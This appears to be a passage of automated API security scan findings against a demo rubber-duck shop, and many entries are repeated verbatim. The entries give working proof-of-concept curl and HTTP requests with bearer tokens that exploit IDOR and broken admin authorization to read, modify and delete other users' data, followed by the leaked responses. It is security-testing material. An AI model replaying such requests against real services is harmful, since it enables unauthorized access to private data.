curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
